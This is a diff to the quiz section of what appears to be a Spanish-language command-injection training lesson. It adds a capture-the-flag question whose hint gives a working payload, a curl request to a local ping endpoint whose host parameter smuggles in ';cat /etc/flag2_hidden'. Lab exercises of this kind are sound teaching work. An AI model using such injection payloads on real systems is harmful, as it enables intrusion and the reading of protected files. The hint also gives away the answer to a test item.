@@ -23,6 +23,10 @@ questions:
         label: "Ejecuta solo el primero"
       - id: d
         label: "Es un comentario"
+  - id: command-injection-t01-q04
+    prompt: "Read the flag from /etc/flag2_hidden using command injection."
+    hint: "curl 'http://127.0.0.1:18084/ping?host=x;cat /etc/flag2_hidden'"
+    kind: flag
 ---
 
 ## El ping que no debería existir
